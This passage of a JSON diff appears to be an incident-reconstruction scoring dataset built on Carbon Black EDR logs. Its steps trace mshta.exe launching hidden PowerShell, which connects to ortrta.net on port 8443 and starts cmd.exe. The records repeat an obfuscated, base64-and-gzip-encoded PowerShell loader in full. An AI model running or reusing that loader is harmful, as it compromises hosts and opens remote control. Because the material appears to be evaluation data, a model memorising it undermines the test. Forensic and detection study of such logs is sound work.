oAWQA5AEMALwBLAHoAYQBKAEkANgBuAGoALwBZAEYANQBJAC8AQgBaAHMANQBxADMAOQBvAGMAMwBrAEEAUQByAEcANgBlAHMAMwBWAHAAWAA5AHEATgBQADIAJwAnACsAJwAnAFkAdwAzAGkAWgA5AC8AcQBoAEQALwBSAFMAWgA4AHEAdwBYAHEAWABwAGIAJwAnACsAJwAnAEgASABvAEUATQB7ADEAfQBkADUAVwBGAHEAawBlACcAJwArACcAJwB6AFgAcQBYAFoAagBXAGwAbQBHAHUASQBJAGwAeAA3AHQAaQBoAEwARQBZAEYANwBBACcAJwArACcAJwB0AHcAawB5AHUAeABXAEMAYQBFACsANwA1AFcAOABxAFUARwBiAFAAagBkAFAAMwBzAHYAdAA0AGMAbQBsADEAMABZADEANABVAG0AdwA5AHQAeABDAHkANgBuADMANwA1AGYAewAxAH0ASQB0AFEATABuAHMAeQBOAE0AJwAnACsAJwAnAFUAbwBqAEYAdABlAGwAeAA3AFkAawBRAGUAdQBUAEgAaQBYAGwAVgBCAGkAKwAvADIAQQBkAHUAagB1AEsASgAyAE4AMQAzAGoAdwBCAGwAOQBJADIATwBkAGsARwBjAHoAewAxAH0AVQBSAFAARgBIAFEAdwBVADMASgBBAGIARgArAHAAdAB7ADEAfQBmAFEAcwAzADIASAB7ADEAfQBMAHgAUgBWAHEALwBiAG4AbQBjAGYAUQAnACcAKwAnACcAMABTAHMAbABMADcARQA2AEgAZQBtAEwAQgBTACsAQQBBAE0AUgBsAE8AdgBlAEoAWABvAHoATQA5AHcATQBBAFYAKwBpAFIAVQBHAEwAOAA0AHYATAB5AEkAVgBJADUAcQA5AGkATQBwAGMAeQBuAGMATQBmAHcARQAvADAASwBaADUANwBsAC8AVwBQADAAdQBHAGsAbAAxAGoAcwAxAFgAawAxADkATwB2AE8AaAAyAFAAKwB6ADAAcgBvAGMAWgB5AEoAbgBRAGYAQQB7ADEAfQA2ADMANABWAGUAQgBlAEcAUwBJAGkAOQBpAEMAMgBFAEIALwBvAGUAWABoAC8AOQBCAG0AQgBUAHMAeQBvAEEATAA1ADYAbgA5AC8AUQAyAGgAZgAxAGYAeQBtAHsAMQB9AHcAQQBBAEEAewAwAH0AewAwAH0AJwAnACkALQBmACcAJwA9ACcAJwAsACcAJwBnACcAJwApACkAKQApACwAWwBTAHkAcwB0AGUAbQAuAEkATwAuAEMAbwBtAHAAcgBlAHMAcwBpAG8AbgAuAEMAbwBtAHAAcgBlAHMAcwBpAG8AbgBNAG8AZABlAF0AOgA6AEQAZQBjAG8AbQBwAHIAZQBzAHMAKQApACkALgBSAGUAYQBkAFQAbwBFAG4AZAAoACkAKQApACcAOwAkAHMALgBVAHMAZQBTAGgAZQBsAGwARQB4AGUAYwB1AHQAZQA9ACQAZgBhAGwAcwBlADsAJABzAC4AUgBlAGQAaQByAGUAYwB0AFMAdABhAG4AZABhAHIAZABPAHUAdABwAHUAdAA9ACQAdAByAHUAZQA7ACQAcwAuAFcAaQBuAGQAbwB3AFMAdAB5AGwAZQA9ACcASABpAGQAZABlAG4AJwA7ACQAcwAuAEMAcgBlAGEAdABlAE4AbwBXAGkAbgBkAG8AdwA9ACQAdAByAHUAZQA7ACQAcAA9AFsAUwB5AHMAdABlAG0ALgBEAGkAYQBnAG4AbwBzAHQAaQBjAHMALgBQAHIAbwBjAGUAcwBzAF0AOgA6AFMAdABhAHIAdAAoACQAcwApADsA",
+              "object_name": "c:\\windows\\system32\\windowspowershell\\v1.0\\powershell.exe",
+              "remote_ip": null,
+              "remote_port": null,
+              "netconn_domain": null,
+              "childproc_name": "c:\\windows\\system32\\windowspowershell\\v1.0\\powershell.exe",
+              "childproc_pid": 3820
+            }
+          ],
+          "supporting_evidence": {
+            "source_types": [
+              "CBC event"
+            ],
+            "sample_logs": [
+              "cbc-edr table=cbc_events row_id=3793 time=2022-07-20T00:53:48.9708009Z action=ACTION_CREATE_PROCESS process=c:\\windows\\system32\\windowspowershell\\v1.0\\powershell.exe pid=2976 parent_path=c:\\windows\\system32\\mshta.exe parent_pid=4724 process_cmdline=\"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\" -nop -w hidden -e aQBmACgAWwBJAG4AdABQAHQAcgBdADoAOgBTAGkAegBlACAALQBlAHEAIAA0ACkAewAkAGIAPQAnAHAAbwB3AGUAcgBzAGgAZQBsAGwALgBlAHgAZQAnAH0AZQBsAHMAZQB7ACQAYgA9ACQAZQBuAHYAOgB3AGkAbgBkAGkAcgArACcAXABzAHkAcwB3AG8AdwA2ADQAXABXAGkAbgBkAG8AdwBzAFAAbwB3AGUAcgBTAGgAZQBsAGwAXAB2ADEALgAwAFwAcABvAHcAZQByAHMAaABlAGwAbAAuAGUAeABlACcAfQA7ACQAcwA9AE4AZQB3AC0ATwBiAGoAZQBjAHQAIABTAHkAcwB0AGUAbQAuAEQAaQBhAGcAbgBvAHMAdABpAGMAcwAuAFAAcgBvAGMAZQBzAHMAUwB0AGEAcgB0AEkAbgBmAG8AOwAkAHMALgBGAGkAbABlAE4AYQBtAGUAPQAkAGIAOwAkAHMALgBBAHIAZwB1AG0AZQBuAHQAcwA9ACcALQBuAG8AcAAgAC0AdwAgAGgAaQBkAGQAZQBuACAALQBjACAAJgAoAFsAcwBjAHIAaQBwAHQAYgBsAG8AYwBrAF0AOgA6AGMAcgBlAGEAdABlACgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBJAE8ALgBTAHQAcgBlAGEAbQBSAGUAYQBkAGUAcgAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABTAHkAcwB0AGUAbQAuAEkATwAuAEMAbwBtAHAAcgBlAHMAcwBpAG8AbgAuAEcAegBpAHAAUwB0AHIAZQBhAG0AKAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABTAHkAcwB0AGUAbQAuAEkATwAuAE0AZQBtAG8AcgB5AFMAdAByAGUAYQBtACgALABbAFMAeQBzAHQAZQBtAC4AQwBvAG4AdgBlAHIAdABdADoAOgBGAHIAbwBtAEIAYQBzAGUANgA0AFMAdAByAGkAbgBnACgAKAAoACcAJwBIADQAcwBJAEEATQBVAEwAMQAyAEkAQwBBADcAVgBYAGIAWQAvAGEAUgAnACcAKwAnACcAaABEACcAJwArACcAJwArAFgAcQBuAC8AdwBZAHEAUQBNAEEAbwBIAE4AcgBpAFgAdQAwAGkAUgBhAHMAUAB4AEYAbQB4AGUALwBIAFoAQQBVAFcAWABzAHQAYgAzAEgAMgBrAHYAcwBOAFIAeABwACsAOQA4ADcAQwAvAGoAdQBvAGwAegBhAHQARgBJAHMAVwBhAHgAMwBaADIAWgBuAG4AMwBsAG0AWgB7ADEAfQBtAEwAMQBHAGUAWQBwAHsAMQB9AEkAZQBDAEgALwA4AC8ASgBOAHcAZQBhAFoAZQA1AGkAVwBDAFcAUABHAEwAcwBGADAAWABLAHIAdABzAHUAcAAzAFcAbgBwAGMAcgBPADYAcAAxAGgAQQArAEMAdQBGAEoAMwB1AHkANQBOAFAASgB5AHUAMwA3AC8AdgBGAEYAbQBHAFUAbgBiACsAYgB2AFEAUgBVAC8ATQBjAEoAUgB1AEMAVQBTADcAVwBoAEQAOABGAE4AMABZAFoAdQBwAHAAcwBIAHAARABQAGgARAArAEUAeQB1ACsATgBQAHEARQBiAGoAMQB6AEUAagBoADMAUABqADUARgB3AHAAYQBZAEIAWAB4AHQAVAAzACsATwBlAE4AYwB3AGQAdwBVAHkAcwAvAHYAWgBiAHQAYgBhADYAawB0AGUATgB1ADAAKwBGAFIAMwBLAHgAYQBoACcAJwArACcAJwA1AHoAaABwAEoARwBRAEUAaQAxAEoAdgB4AFYANAB4AHQAYQB4AHgAMABTAHEAegByADIATQA1AHIAVABrAEQAVgBjAG4ATABaACcAJwArACcAJwBiAEQAVAB2AE4AdgBSAEEAWgBZAEcAMgBQAGQATQBSAGkARwB1AFIAVgBPAE0AegB6AGMAVABMAEUAaQBpAHcAOQBuADQAcQBiAE8AUQB1AEoAVgBSAGgATwBNACsAcQByAFEAWgBDAGgAUABLAC8AVwBoAFIAWABmAFkATABWAGUALwB5AHEAdQBMAHIAdgBQAGkANQBUAGgAQgBEAFcARwBLAFUATQBaADMAWgBrAG8AMgAyAE0AZgA1AFkAMgBCAGwAdwBZAEUAegBWAEcANABCAGkAMgBUAFoAVABpAE4AMQByAFUAYQBpAE8AMwBwAEYAbwBtAFYAdABDAEMAawBMAHYAdwBYAE0ANgBLAEIARABpAFYAMgAzADYAcwBrAHYAbABRAEMAcQBTAG4ATABhAG4AVwBJADYAaQB2AG4AMQBHAGwAUQBFAEgAVABXAHIATAA3AGkANgBJAGsASgBOAFgAaQBlADIAQQBBAEkALwBzAFYAQgBEAEUAcwBHAEgAWgBlAHQAVgB5AGoAMABQAEYARQArAHEAOQBNAEsAQQBwAC8ARgBLAGMAMwB4AFMAZgBlAEQASQBOAFUARgBIAFgAYgAzAEcATQAyAE8AOABGAG0AeABzAHsAMQB9AEwAVgAxAGsAKwBJAEMANQBWAEEAQwB0AFAANgA5ADEAcQBUAFMAMQBXAHUAVwBBAFEAdwBzADMASQBvAEQAdABiAFAAKwBsADgAUQBvAEIASgB3AHAAWAA4AHsAMQB9AGMAeABlAEYATwBFAFgAZABZACsAbwBsADIAQwAvADUASwByADQAVwBFAHgAUQBTAGQATQBLAGoAVQBZAG8AWgA0AEoANQBZAHYAUwB5AHsAMQB9AG8ASQBzAEkAaQBqAHoARwBVAGUAYgBVACsARQByAHQATABzAEgAcwBTAFYAYwByAE0AQQBsAFEAcAB2AG8AUQAxAHgAeQA4AHsAMQB9AHAARABYAHYAbgBUAG0ASABEAGkAeAAnACcAKwAnACcATwBrAHgAMQBsAEEAJwAnACsAJwAnAEIAMgA1ADIALwB7ADEAfQBhAGkAVwBFAEwARQBHAGwAOQBDAFUAegBqAHUAWAB1AC8AQgB1AEUAcQBoADMAaQA1AFgAbABkAG0AQgBhAFEAcABuADUAZABNAEoARgBIAFUARgBBAFgAMQBEAFQASABsAHkAVwAxAFkAUABRADAAcgBEADYANwBxAHgAZQBFAFkAZAAvAEwAVwBXAGwAdQBYAGYAcwBDAHoATQB1AG0ASABaAHIAbQBMAEMAdAA4AGkAQwBrAEEAWQBKAGsANwA1AEcATwBQAGMARAB6AHEAdwB7ADEAfQBBAEgAUwBEAHUAYQBPAEMAbwAzAHIANwA2AEsAUgBzAGMAagBCAEgASQBIAEwATwAwAGgARwBqAEQARABVAFQAQQBaAFoAMABvAEcAZgBwADUAWQBVAFcAdQBZAGkAQQAyAFQASABVAEUASgB5AEoAeQBLAFIAbwA5ADQARQBaAFMASQBTADQAYQBjAHEATwBWAEYASwBLAGkAKwA2AG0AYQBaAEIAbQBmAE8AYwAxAFIASwBPAEYANAA0AEMAYQBFADIAQwAnACcAKwAnACcAVwBWADEAdwBjAEUAWgB7ADEAfQB3AEwARQBFAFEAWgBtAC8AUwA4AFgAdgBxADQAOAA0AEUAcwBuAFEANQBlADQAaQBHAFYAcQByAGIAUQBqADQAKwBTAHYASABNAEwAZgBIAHoAaABCAEwALwBpAGMAMABNAHsAMQB9AFkASQBOAEgATABhAEsASgA1AE8AYgBwAFcAegBqAFYARwBmAE4ATwBjADQASwBrAEsAegAyAEsAWQBFAGoAJwAnACsAJwAnADAAWQBiAGIARQA4AFAATQBDAHIAdwAyAHQAMwAzAHcAVQBmAFIANQBRAGQAUAAzAFkASABUAGQAMwB2ADUATgBOACsANwAwAGIARgBoACsAagB7ADEAfQAzAHgAaQBxAEgANAB3AEMAZABHACcAJwArACcAJwB1AEMAMwAnACcAKwAnACcATQB4AFIAVwBHAGUAcQBEAG0AWgBZADAAcABUAFkAMQB5AFEATAB4AHYAYQBRAEwAWQBiAHEAdwBNAEoAUwB0AEkAaAA5AEkAawAzAEIAaAByAG4ASQBKAFgAdwBZAHUATAByAGYAMQBUADQAZgBXAGoAbgBRAFYARgBFAEcAOQA1AEwAYQBiAGkAdQBUAHQAcgBRAEYAOABCAFoAWQBqAHIAWgBxAFkAQwBUADQAOABEAGkARwBNAFIAVABUAHkAVgB7ADEAfQBiADUAcABvADAASgBIAGUAagB6AG4AegBqAHQAJwAnACsAJwAnAG4AcABMAGwAdwB5AGEAUwBpADgATwBYAFoAcQBiADEANAB0AHUAcwA5AG0AOABEAGIAegArAEwAeQBSAFEATgBSAHEAMABTAE8ARQA1AGMAMgBvAE4ALwBFAFIAcgBOAGgAMAA5AFkASgBZACcAJwArACcAJwB0AEcANQBiADkATgB2ADcATQAnACcAKwAnACcAegAyAG0ANQB0ADkAZQBlACsANQB7ADEAfQB2AHoAQgB0ADUALwBLAEIARwBIADMAdgBCAGIAcABQAE0AOQAwAEYAYgBqAHkAdwB5AGkAMwBSAEwATABmAFIAdQBIAGoAbAB7ADEAfQB4ADMAaQBZAHYAUgBzAE8AbwBwAGIAUgAyAFUAYQB6AGUAKwAyAHcANgBUAHYAMwBTADMAYwAwADkAdQA1AG4AZQA4AFAAUwAyACsATQBIAHYAVABYAHMAeABHAE8AegBOAHoAZQBzAHoAaQBIAGEAOQBFAG0AMgBOAEwAWABCADAAagBXAHkAegBSAEYAMABXAHYARgB4ADAANQBMAEoAKwBQAE4AJwAnACsAJwAnAFcAewAxAH0AYgAwAEsAbwArAHYATABrADQANgBpADYASwBaAG0ATABkAHgAbAA3AEMAZgBiAEoAegB0AHEAUAA3AHAAMgAwAGkAUgB0ADMAagBxAFcAMwBhAEoAZAA4AEoAbQArAFAAWQBMAEQARQAzAHoARAAvAFIANgAzAFkAMgBPADUAbABSAFMAegBxADgAbQBMADEAbwAyADgAYQBNADkAegAvAGMARwBZAGIAZQB6AGwAWQB0AEUATwBaAHIANABwAE8ANQBQAGUAYQBMAHUAeABSAHAAYgA5ADAAQgB0AGIALwBlAFgARQAnACcAKwAnACcAZABPAFAASABoAGUAdQByAGQAagArACsAeAA4AHQAbQB2ADMAbgByAGoAaAA2AEoAUQBkAFgAdQBtAE0AWQA5AHcARQBRAE8ATABDAGQANQB5AEIAeABUAGUAUQBkAHIAcgBoAGYAdABRAG0AKwBvAEEAawA2AGQAawBkAEsAbgBkADMAYQBmAGgAawA0AFMAeQAvAFAAZABkAGYALwBrAEYAKwBEAG8ASgBCAEgAVAA0AHAAagBMADkAdwA0AEQAMgAvAGEARwBrAGEAVQBDADcAdgBPAHAASwBpAHYAVABwAG0ATwAxADcANAAzAHIATwB4ADgAOAAxAGoANwBOACsAcABGADYAQgB5AE0AUAAzAHAAbQBxAFcAVgA0AFAAYgArADIAMwA5ADAAMQA1AEMAWABzAHIAYQBlAHEAMABJAG4AVQBJAGEANwBhADgAcABIAGMANwBiADYAVABzACcAJwArACcAJwBtAHcANwBuAHoAMgBjAGwASAA2AGoAKwBCAE8AegBmAEUAMQBjADMAdwB1AHYAKwBuAHMAZAA0ADcANgBmAHoAWQA5AEMALwBLAHoAYQBKAEkANgBuAGoALwBZAEYANQBJAC8AQgBaAHMANQBxADMAOQBvAGMAMwBrAEEAUQByAEcANgBlAHMAMwBWAHAAWAA5AHEATgBQADIAJwAnACsAJwAnAFkAdwAzAGkAWgA5AC8AcQBoAEQALwBSAFMAWgA4AHEAdwBYAHEAWABwAGIAJwAnACsAJwAnAEgASABvAEUATQB7ADEAfQBkADUAVwBGAHEAawBlACcAJwArACcAJwB6AFgAcQBYAFoAagBXAGwAbQBHAHUASQBJAGwAeAA3AHQAaQBoAEwARQBZAEYANwBBACcAJwArACcAJwB0AHcAawB5AHUAeABXAEMAYQBFACsANwA1AFcAOABxAFUARwBiAFAAagBkAFAAMwBzAHYAdAA0AGMAbQBsADEAMABZADEANABVAG0AdwA5AHQAeABDAHkANgBuADMANwA1AGYAewAxAH0ASQB0AFEATABuAHMAeQBOAE0AJwAnACsAJwAnAFUAbwBqAEYAdABlAGwAeAA3AFkAawBRAGUAdQBUAEgAaQBYAGwAVgBCAGkAKwAvADIAQQBkAHUAagB1AEsASgAyAE4AMQAzAGoAdwBCAGwAOQBJADIATwBkAGsARwBjAHoAewAxAH0AVQBSAFAARgBIAFEAdwBVADMASgBBAGIARgArAHAAdAB7ADEAfQBmAFEAcwAzADIASAB7ADEAfQBMAHgAUgBWAHEALwBiAG4AbQBjAGYAUQAnACcAKwAnACcAMABTAHMAbABMADcARQA2AEgAZQBtAEwAQgBTACsAQQBBAE0AUgBsAE8AdgBlAEoAWABvAHoATQA5AHcATQBBAFYAKwBpAFIAVQBHAEwAOAA0AHYATAB5AEkAVgBJADUAcQA5AGkATQBwAGMAeQBuAGMATQBmAHcARQAvADAASwBaADUANwBsAC8AVwBQADAAdQBHAGsAbAAxAGoAcwAxAFgAawAxADkATwB2AE8AaAAyAFAAKwB6ADAAcgBvAGMAWgB5AEoAbgBRAGYAQQB7ADEAfQA2ADMANABWAGUAQgBlAEcAUwBJAGkAOQBpAEMAMgBFAEIALwBvAGUAWABoAC8AOQBCAG0AQgBUAHMAeQBvAEEATAA1ADYAbgA5AC8AUQAyAGgAZgAxAGYAeQBtAHsAMQB9AHcAQQBBAEEAewAwAH0AewAwAH0AJwAnACkALQBmACcAJwA9ACcAJwAsACcAJwBnACcAJwApACkAKQApACwAWwBTAHkAcwB0AGUAbQAuAEkATwAuAEMAbwBtAHAAcgBlAHMAcwBpAG8AbgAuAEMAbwBtAHAAcgBlAHMAcwBpAG8AbgBNAG8AZABlAF0AOgA6AEQAZQBjAG8AbQBwAHIAZQBzAHMAKQApACkALgBSAGUAYQBkAFQAbwBFAG4AZAAoACkAKQApACcAOwAkAHMALgBVAHMAZQBTAGgAZQBsAGwARQB4AGUAYwB1AHQAZQA9ACQAZgBhAGwAcwBlADsAJABzAC4AUgBlAGQAaQByAGUAYwB0AFMAdABhAG4AZABhAHIAZABPAHUAdABwAHUAdAA9ACQAdAByAHUAZQA7ACQAcwAuAFcAaQBuAGQAbwB3AFMAdAB5AGwAZQA9ACcASABpAGQAZABlAG4AJwA7ACQAcwAuAEMAcgBlAGEAdABlAE4AbwBXAGkAbgBkAG8AdwA9ACQAdAByAHUAZQA7ACQAcAA9AFsAUwB5AHMAdABlAG0ALgBEAGkAYQBnAG4AbwBzAHQAaQBjAHMALgBQAHIAbwBjAGUAcwBzAF0AOgA6AFMAdABhAHIAdAAoACQAcwApADsA object_name=c:\\windows\\system32\\windowspowershell\\v1.0\\powershell.exe childproc_name=c:\\windows\\system32\\windowspowershell\\v1.0\\powershell.exe childproc_pid=3820"
+            ]
+          }
+        },
+        {
+          "step_id": "s4_09_ps2976_hidden_parent-S03",
+          "order": 3,
+          "subject": "powershell.exe (PID 3820)",
+          "action": "initiated connection",
+          "object": "ortrta.net / 10.193.66.115:8443",
+          "segment": "observed_attack_cluster",
+          "evidence_basis": "Canonical CBC EDR event row",
+          "confidence": "observed",
+          "process_code_object": "ortrta.net / 10.193.66.115:8443",
+          "scoring_template": {
+            "subject": {
+              "max": 1,
+              "score": null,
+              "note": ""
+            },
+            "action": {
+              "max": 1,
+              "score": null,
+              "note": ""
+            },
+            "object": {
+              "max": 1,
+              "score": null,
+              "note": ""
+            },
+            "evidence": {
+              "max": 1,
+              "score": null,
+              "note": ""
+            },
+            "step_total": {
+              "max": 4,
+              "score": null
+            }
+          },
+          "canonical_evidence": [
+            {
+              "source_stream": "cbc-edr",
+              "source_table": "cbc_events",
+              "source_row_id": 12843,
+              "timestamp_utc": "2022-07-20T00:53:49.4778299Z",
+              "action": "ACTION_CONNECTION_CREATE",
+              "process_path": "c:\\windows\\system32\\windowspowershell\\v1.0\\powershell.exe",
+              "process_pid": 3820,
+              "parent_path": "c:\\windows\\system32\\windowspowershell\\v1.0\\powershell.exe",
+              "parent_pid": 2976,
+              "process_cmdline": "\"powershell.exe\" -nop -w hidden -c &([scriptblock]::create((New-Object System.IO.StreamReader(New-Object System.IO.Compression.GzipStream((New-Object System.IO.MemoryStream(,[System.Convert]::FromBase64String((('H4sIAMUL12ICA7VXbY/aR'+'hD'+'+Xqn/wYqQMAoHNriXu0iRasPxFmxe/HZAUWXstb3H2kvsNRxp+987C/juolzatFIsWax3Z2Znn3lmZ{1}mL1GeYp{1}IeCH/8/JNweaZe5iWCWPGLsF0XKrtsup3WnpcrO6p1hA+CuFJ3uy5NPJyu37/vFFmGUnb+bvQRU/McJRuCUS7WhD8FN0YZuppsHpDPhD+Eyu+NPqEbj1zEjh3Pj5FwpaYBXxtT3+OeNcwdwUys/vZbtba6kteNu0+FR3Kxah'+'5zhpJGQEi1JvxV4xtaxx0Sqzr2M5rTkDVcnLZ'+'bDTvNvRAZYG2PdMRiGuRVOMzzcTLEiiw9n4qbOQuJVRhOM+qrQZChPK/WhRXfYLVe/yquLrvPi5ThBDWGKUMZ3Zko22Mf5Y2BlwYEzVG4Bi2TZTiN1rUaiO3pFomVtCCkLvwXM6KBDiV236skvlQCqSnLanWI6ivn1GlQEHTWrL7i6IkJNXie2AAI/sVBDEsGHZetVyj0PFE+q9MKAp/FKc3xSfeDINUFHXb3GM2O8Fmxs{1}LV1k+IC5VACtP691qTS1WuWAQws3IoDtbP+l8QoBJwpX8{1}cxeFOEXdY+ol2C/5Kr4WExQSdMKjUYoZ4J5YvSy{1}oIsIijzGUebU+ErtLsHsSVcrMAlQpvoQ1xy8{1}pDXvnTmHDix'+'Okx1lA'+'B252/{1}aiWELEGl9CUzjuXu/BuEqh3i5XldmBaQpn5dMJFHUFAX1DTHlyW1YPQ0rD67qxeEYd/LWWluXfsCzMumHZrmLCt8iCkAYJk75GOPcDzqw{1}AHSDuaOCo3r76KRscjBHIHLO0hGjDDUTAZZ0oGfp5YUWuYiA2THUEJyJyKRo94EZSIS4acqOVFKKi+6maZBmfOc1RKOF44CaE2C'+'WV1wcEZ{1}wLEEQZm/S8Xvq484EsnQ5e4iGVqrbQj4+SvHMLfHzhBL/ic0M{1}YINHLaKJ5ObpWzjVGfNOc4KkKz2KYEj'+'0YbbE8PMCrw2t33wUfR5QdP3YHTd3v5NN+70bFh+j{1}3xiqH4wCdG'+'uC3'+'MxRWGeqDmZY0pTY1yQLxvaQLYbqwMJStIh9Ik3BhrnIJXwYuLrf1T4fWjnQVFEG95LabiuTtrQF8BZYjrZqYCT48DiGMRTTyV{1}b5po0JHejznzjt'+'npLlwyaSi8OXZqb14tus9m8Dbz+LyRQNRq0SOE5c2oN/ERrNh09YJY'+'tG5b9Nv7M'+'z2m5t9ee+5{1}vzBt5/KBGH3vBbpPM90Fbjywyi3RLLfRuHjl{1}x3iYvRsOopbR2Uaze+2w6Tv3S3c09u5ne8PS2+MHvTXsxGOzNzesziHa9Em2NLXB0jWyzRF0WvFx05LJ+PN'+'W{1}b0Ko+vLk46i6KZmLdxl7CfbJztqP7p20iRt3jqW3aJd8Jm+PYLDE3zD/R63Y2O5lRSzq8mL1o28aM9z/cGYbezlYtEOZr4pO5PeaLuxRpb90Btb/eXE'+'dOPHheurdj++x8tmv3nrjh6JQdXumMY9wEQOLCd5yBxTeQdrrhftQm+oAk6dkdKnd3afhk4Sy/Pddf/kF+DoJBHT4pjL9w4D2/aGkaUC7vOpKivTpmO1743rOx881j7N+pF6ByMP3pmqWV4Pb+239015CXsraeq0InUIa7a8pHc7b6Ts'+'mw7nz2clH6j+BOzfE1c3wuv+nsd476fzY9C/KzaJI6nj/YF5I/BZs5q39oc3kAQrG6es3VpX9qNP2'+'Yw3iZ9/qhD/RSZ8qwXqXpb'+'HHoEM{1}d5WFqke'+'zXqXZjWlmGuIIlx7tihLEYF7A'+'twkyuxWCaE+75W8qUGbPjdP3svt4cml10Y14Umw9txCy6n375f{1}ItQLnsyNM'+'UojFtelx7YkQeuTHiXlVBi+/2AdujuKJ2N13jwBl9I2OdkGcz{1}URPFHQwU3JAbF+pt{1}fQs32H{1}LxRVq/bnmcfQ'+'0SslL7E6HemLBS+AAMRlOveJXozM9wMAV+iRUGL84vLyIVI5q9iMpcyncMfwE/0KZ57l/WP0uGkl1js1Xk19OvOh2P+z0rocZyJnQfA{1}634VeBeGSIi9iC2EB/oeXh/9BmBTsyoAL56n9/Q2hf1fym{1}wAAA{0}{0}')-f'=','g')))),[System.IO.Compression.CompressionMode]::Decompress))).ReadToEnd()))",
+              "object_name": "ortrta.net",
+              "remote_ip": "10.193.66.115",
+              "remote_port": 8443,
+              "netconn_domain": "ortrta.net",
+              "childproc_name": null,
+              "childproc_pid": null
+            }
+          ],
+          "supporting_evidence": {
+            "source_types": [
+              "CBC event"
+            ],
+            "sample_logs": [
+              "cbc-edr table=cbc_events row_id=12843 time=2022-07-20T00:53:49.4778299Z action=ACTION_CONNECTION_CREATE process=c:\\windows\\system32\\windowspowershell\\v1.0\\powershell.exe pid=3820 parent_path=c:\\windows\\system32\\windowspowershell\\v1.0\\powershell.exe parent_pid=2976 process_cmdline=\"powershell.exe\" -nop -w hidden -c &([scriptblock]::create((New-Object System.IO.StreamReader(New-Object System.IO.Compression.GzipStream((New-Object System.IO.MemoryStream(,[System.Convert]::FromBase64String((('H4sIAMUL12ICA7VXbY/aR'+'hD'+'+Xqn/wYqQMAoHNriXu0iRasPxFmxe/HZAUWXstb3H2kvsNRxp+987C/juolzatFIsWax3Z2Znn3lmZ{1}mL1GeYp{1}IeCH/8/JNweaZe5iWCWPGLsF0XKrtsup3WnpcrO6p1hA+CuFJ3uy5NPJyu37/vFFmGUnb+bvQRU/McJRuCUS7WhD8FN0YZuppsHpDPhD+Eyu+NPqEbj1zEjh3Pj5FwpaYBXxtT3+OeNcwdwUys/vZbtba6kteNu0+FR3Kxah'+'5zhpJGQEi1JvxV4xtaxx0Sqzr2M5rTkDVcnLZ'+'bDTvNvRAZYG2PdMRiGuRVOMzzcTLEiiw9n4qbOQuJVRhOM+qrQZChPK/WhRXfYLVe/yquLrvPi5ThBDWGKUMZ3Zko22Mf5Y2BlwYEzVG4Bi2TZTiN1rUaiO3pFomVtCCkLvwXM6KBDiV236skvlQCqSnLanWI6ivn1GlQEHTWrL7i6IkJNXie2AAI/sVBDEsGHZetVyj0PFE+q9MKAp/FKc3xSfeDINUFHXb3GM2O8Fmxs{1}LV1k+IC5VACtP691qTS1WuWAQws3IoDtbP+l8QoBJwpX8{1}cxeFOEXdY+ol2C/5Kr4WExQSdMKjUYoZ4J5YvSy{1}oIsIijzGUebU+ErtLsHsSVcrMAlQpvoQ1xy8{1}pDXvnTmHDix'+'Okx1lA'+'B252/{1}aiWELEGl9CUzjuXu/BuEqh3i5XldmBaQpn5dMJFHUFAX1DTHlyW1YPQ0rD67qxeEYd/LWWluXfsCzMumHZrmLCt8iCkAYJk75GOPcDzqw{1}AHSDuaOCo3r76KRscjBHIHLO0hGjDDUTAZZ0oGfp5YUWuYiA2THUEJyJyKRo94EZSIS4acqOVFKKi+6maZBmfOc1RKOF44CaE2C'+'WV1wcEZ{1}wLEEQZm/S8Xvq484EsnQ5e4iGVqrbQj4+SvHMLfHzhBL/ic0M{1}YINHLaKJ5ObpWzjVGfNOc4KkKz2KYEj'+'0YbbE8PMCrw2t33wUfR5QdP3YHTd3v5NN+70bFh+j{1}3xiqH4wCdG'+'uC3'+'MxRWGeqDmZY0pTY1yQLxvaQLYbqwMJStIh9Ik3BhrnIJXwYuLrf1T4fWjnQVFEG95LabiuTtrQF8BZYjrZqYCT48DiGMRTTyV{1}b5po0JHejznzjt'+'npLlwyaSi8OXZqb14tus9m8Dbz+LyRQNRq0SOE5c2oN/ERrNh09YJY'+'tG5b9Nv7M'+'z2m5t9ee+5{1}vzBt5/KBGH3vBbpPM90Fbjywyi3RLLfRuHjl{1}x3iYvRsOopbR2Uaze+2w6Tv3S3c09u5ne8PS2+MHvTXsxGOzNzesziHa9Em2NLXB0jWyzRF0WvFx05LJ+PN'+'W{1}b0Ko+vLk46i6KZmLdxl7CfbJztqP7p20iRt3jqW3aJd8Jm+PYLDE3zD/R63Y2O5lRSzq8mL1o28aM9z/cGYbezlYtEOZr4pO5PeaLuxRpb90Btb/eXE'+'dOPHheurdj++x8tmv3nrjh6JQdXumMY9wEQOLCd5yBxTeQdrrhftQm+oAk6dkdKnd3afhk4Sy/Pddf/kF+DoJBHT4pjL9w4D2/aGkaUC7vOpKivTpmO1743rOx881j7N+pF6ByMP3pmqWV4Pb+239015CXsraeq0InUIa7a8pHc7b6Ts'+'mw7nz2clH6j+BOzfE1c3wuv+nsd476fzY9C/KzaJI6nj/YF5I/BZs5q39oc3kAQrG6es3VpX9qNP2'+'Yw3iZ9/qhD/RSZ8qwXqXpb'+'HHoEM{1}d5WFqke'+'zXqXZjWlmGuIIlx7tihLEYF7A'+'twkyuxWCaE+75W8qUGbPjdP3svt4cml10Y14Umw9txCy6n375f{1}ItQLnsyNM'+'UojFtelx7YkQeuTHiXlVBi+/2AdujuKJ2N13jwBl9I2OdkGcz{1}URPFHQwU3JAbF+pt{1}fQs32H{1}LxRVq/bnmcfQ'+'0SslL7E6HemLBS+AAMRlOveJXozM9wMAV+iRUGL84vLyIVI5q9iMpcyncMfwE/0KZ57l/WP0uGkl1js1Xk19OvOh2P+z0rocZyJnQfA{1}634VeBeGSIi9iC2EB/oeXh/9BmBTsyoAL56n9/Q2hf1fym{1}wAAA{0}{0}')-f'=','g')))),[System.IO.Compression.CompressionMode]::Decompress))).ReadToEnd())) object_name=ortrta.net remote_ip=10.193.66.115 remote_port=8443 netconn_domain=ortrta.net"
+            ]
+          }
+        },
+        {
+          "step_id": "s4_09_ps2976_hidden_parent-S04",
+          "order": 4,
+          "subject": "powershell.exe (PID 3820)",
+          "action": "started",
+          "object": "cmd.exe (PID 2168)",
+          "segment": "observed_attack_cluster",
+          "evidence_basis": "Canonical CBC EDR event row",
+          "confidence": "observed",
+          "process_code_object": "cmd.exe (PID 2168)",
+          "scoring_template": {
